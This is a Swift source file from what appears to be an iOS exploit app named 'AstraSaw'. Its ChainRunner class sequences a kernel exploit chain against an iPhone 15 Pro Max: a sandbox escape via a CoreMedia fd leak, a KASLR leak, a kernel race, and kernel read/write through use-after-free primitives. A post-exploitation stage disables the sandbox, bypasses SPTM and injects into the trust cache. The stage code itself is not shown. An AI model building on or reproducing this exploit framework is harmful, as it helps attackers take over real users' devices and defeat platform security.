import Foundation

final class ChainRunner: ObservableObject {
    @Published var running = false
    @Published var currentStage = -1
    @Published var logLines: [String] = []
    @Published var stageStatus: [Int: String] = [:]

    private var lineObserver: NSObjectProtocol?
    private var resetObserver: NSObjectProtocol?

    init() {
        lineObserver = NotificationCenter.default.addObserver(
            forName: .wireLogLine, object: nil, queue: .main
        ) { [weak self] note in
            if let line = note.userInfo?["line"] as? String {
                self?.logLines.append(line)
                if self?.logLines.count ?? 0 > 2000 {
                    self?.logLines.removeFirst(500)
                }
            }
        }
        resetObserver = NotificationCenter.default.addObserver(
            forName: .wireLogReset, object: nil, queue: .main
        ) { [weak self] _ in
            self?.logLines.removeAll()
            self?.stageStatus.removeAll()
            self?.currentStage = -1
        }
    }

    deinit {
        if let obs = lineObserver { NotificationCenter.default.removeObserver(obs) }
        if let obs = resetObserver { NotificationCenter.default.removeObserver(obs) }
    }

    @Published var sendStatus: String = ""

    func resetLogs() {
        WireLog.shared.reset()
    }

    func sendLogs() {
        sendStatus = "sending..."
        WireLog.shared.sendLogs { ok in
            self.sendStatus = ok ? "sent ✓" : "fail ✗"
            DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
                self.sendStatus = ""
            }
        }
    }

    func runChain() {
        guard !running else { return }
        running = true
        logLines.removeAll()

        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let log = WireLog.shared
            log.log("╔════════════════════════════════════════╗")
            log.log("║  AstraSaw — full chain exploit         ║")
            log.log("║  target: iPhone 15 Pro Max / 27.0.1    ║")
            log.log("║  chain: sandbox → leak → race → krw    ║")
            log.log("╚════════════════════════════════════════╝")
            log.log("")

            // Stage 0: Recon
            self?.setStage(0, status: "running")
            let recon = Stage0.run()
            self?.setStage(0, status: recon.passed ? "ok" : "warn")

            // Stage 1: Sandbox Escape (CoreMedia fd leak)
            self?.setStage(1, status: "running")
            let sandbox = Stage1.run()
            self?.setStage(1, status: sandbox.escaped ? "ok" :
                          (sandbox.fdLeakEstablished ? "partial" : "fail"))

            // Stage 2: Kernel Info Leak
            self?.setStage(2, status: "running")
            let leak = Stage2.run()
            self?.setStage(2, status: leak.passed ? "ok" : "warn")

            // Stage 3: Kernel Race
            self?.setStage(3, status: "running")
            let race = Stage3.run(kaslrSlide: leak.kaslrSlide)
            self?.setStage(3, status: race.oobDetected ? "ok" : "warn")

            // Stage 4: Kernel R/W
            self?.setStage(4, status: "running")
            let krw = Stage4.run(slide: leak.kaslrSlide, raceResult: race)
            self?.setStage(4, status: krw.passed ? "ok" : "fail")

            // Stage 5: Post-Exploitation
            self?.setStage(5, status: "running")
            let post = Stage5.run(krw: krw)
            self?.setStage(5, status: post.passed ? "ok" : "fail")

            // Summary
            log.log("")
            log.log("╔════════════════════════════════════════╗")
            log.log("║  CHAIN SUMMARY                         ║")
            log.log("╚════════════════════════════════════════╝")
            log.data("stage 0 recon:     \(recon.passed ? "PASS" : "WARN") — \(recon.model) / \(recon.buildNumber)")
            log.data("stage 1 sandbox:   \(sandbox.escaped ? "ESCAPED" : "INTACT") — fdleak=\(sandbox.fdLeakEstablished) files=\(sandbox.filesRead) bytes=\(sandbox.bytesRead)")
            log.data("stage 2 leak:      \(leak.passed ? "LEAKED" : "NO POINTERS") — \(leak.candidatePointers.count) candidates / \(leak.totalBytesScanned)B scanned")
            log.data("stage 3 race:      \(race.oobDetected ? "OOB DETECTED" : "NO SIGNAL") — \(race.totalOps) ops / \(race.errorClasses) classes / k-oob=\(race.kernelOOBCount)")
            let primStr: String
            switch krw.primitive {
            case .pipeKread: primStr = "pipe-kread"
            case .ipcUAF: primStr = "ipc-uaf"
            case .iosurfaceUAF: primStr = "iosurface-uaf"
            case .none: primStr = "none"
            }
            log.data("stage 4 krw:       \(krw.passed ? "ACHIEVED" : "PENDING") — kread=\(krw.kreadWorks) kwrite=\(krw.kwriteWorks) primitive=\(primStr)")
            log.data("stage 5 post:      \(post.passed ? "SANDBOX DISABLED" : "PENDING") — sandbox=\(post.sandboxDisabled) sptm=\(post.sptmBypassed) tc=\(post.trustCacheInjected)")

            if let slide = leak.kaslrSlide {
                log.data("KASLR slide:       0x\(String(slide, radix: 16))")
            }

            log.log("")
            log.log("chain run complete. check stage results above.")

            // HTTP upload disabled — use Xcode console + Share button
            // log.sendLogs(final: true) { _ in }

            DispatchQueue.main.async {
                self?.running = false
            }
        }
    }

    private func setStage(_ n: Int, status: String) {
        DispatchQueue.main.async {
            self.currentStage = n
            self.stageStatus[n] = status
        }
    }
}
